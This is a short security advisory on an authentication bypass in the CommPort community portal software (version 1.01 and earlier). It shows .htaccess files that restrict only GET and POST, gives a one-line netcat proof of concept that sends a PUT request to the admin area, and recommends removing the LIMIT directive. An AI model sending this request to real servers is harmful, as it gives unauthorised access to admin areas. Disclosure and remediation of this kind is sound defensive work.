CommPort 1.01 <= Authentication Bypass Vulnerability
----------------------------------------------------

Discovered by: Jean Pascal Pereira <pereira@secbiz.de>

Vendor information:

"A &#039;Community Portal&#039; generator that can be tailored for any location.
Each user gets a personal portal page to which they can add their own
and international content. This allows any individual to always have a page
of their own personal favourites in front of them. Channels may be either
&#039;active&#039; with continually updated content such as weather or news headlines
or &#039;passive&#039; with collections of links."

Vendor URI: http://www.tc.ca/commport/

----------------------------------------------------

Risk-level: Medium/High

The application is prone to an authentication bypass vulnerability.

----------------------------------------------------

/htdocs/cp/.htaccess:

AuthName "Community Portal"
AuthType Basic
AuthUserFile /home/piwcommport/auth/.commport

<limit GET POST>
require valid-user
</limit>

ErrorDocument 401 /signup.cgi

----------------------------------------------------

/htdocs/cp/admin/.htaccess:

AuthName "Community Portal"
AuthType Basic
AuthUserFile /home/piwcommport/auth/.commport

<limit GET POST>
require valid-user
</limit>

ErrorDocument 401 /signup.cgi

----------------------------------------------------

The application protects specific areas by using base authentication.

Since the authentication is limited to GET and POST, it can be bypassed
by using different or random request types.

----------------------------------------------------

Exploit / Proof Of Concept:

$ perl -e &#039;print "PUT /cp/admin/ HTTP/1.0\n\n"&#039; | nc [TARGET] 80

-------------------------------------

Solution:

Remove the LIMIT directive from any htaccess file stored in the project directory.
